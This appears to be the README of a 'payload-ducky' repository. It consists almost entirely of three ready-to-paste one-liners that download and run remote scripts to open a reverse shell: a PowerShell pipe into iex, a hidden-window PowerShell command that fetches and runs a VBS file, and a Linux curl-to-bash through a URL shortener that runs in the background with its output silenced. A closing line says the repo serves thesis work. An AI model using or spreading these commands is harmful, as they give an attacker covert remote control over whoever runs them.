# payload-ducky
## use the following command in powershell to create the reverse shell
```
irm https://raw.githubusercontent.com/sazid570/payload-ducky/refs/heads/main/final-reverse.ps1 | iex
```

## use the following command in cmd (this will not show a separate window)
```
powershell -w hidden -c "iwr 'https://raw.githubusercontent.com/sazid570/payload-ducky/refs/heads/main/final-reverse.vbs' -OutFile $env:TEMP\r.vbs; & wscript $env:TEMP\r.vbs"

```

## use the following command in linux terminal(debian tested)
```
(nohup curl -fsSL https://tinyurl.com/570linux | bash > /dev/null 2>&1 &) && exit
```

### This repo is to serve the purpose of the thesis work in ECE, not to spread harmful codes to others.
